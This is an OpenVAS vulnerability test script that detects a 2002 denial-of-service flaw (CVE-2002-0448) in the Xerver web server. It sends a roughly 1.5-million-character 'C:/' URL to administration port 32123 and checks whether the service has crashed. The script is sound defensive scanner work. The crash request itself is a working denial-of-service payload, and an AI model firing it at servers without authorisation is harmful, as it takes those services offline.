###############################################################################
# OpenVAS Vulnerability Test
# $Id: Xerver_DoS.nasl 4904 2017-01-02 12:45:48Z cfi $
#
# Xerver web server DOS
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added BugtraqID and CAN
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# From Bugtraq :
# Date: Fri, 8 Mar 2002 18:39:39 -0500 ?
# From:"Alex Hernandez" <al3xhernandez@ureach.com> 

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11015");
  script_version("$Revision: 4904 $");
  script_tag(name:"last_modification", value:"$Date: 2017-01-02 13:45:48 +0100 (Mon, 02 Jan 2017) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(4254);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2002-0448");
  script_name("Xerver web server DOS");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2002 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(32123);

  tag_summary = "It was possible to crash the Xerver web server by sending a long URL 
  (C:/C:/...C:/) to its administration port.";

  tag_impact = "A cracker may use this attack to make this
  service crash continuously.";

  tag_solution = "Upgrade your software";

  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);
  script_tag(name:"impact", value:tag_impact);

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

port = 32123;
if( ! get_port_state( port ) ) exit( 0 );
soc = open_sock_tcp( port );
if( ! soc ) exit( 0 );

s = string( "GET /", crap(data:"C:/", length:1500000 ), "\r\n\r\n" );
send( socket:soc, data:s );
close( soc );

soc = open_sock_tcp( port );
if( ! soc ) {
  security_message( port:port );
  exit( 0 );
}

close(soc);

exit( 99 );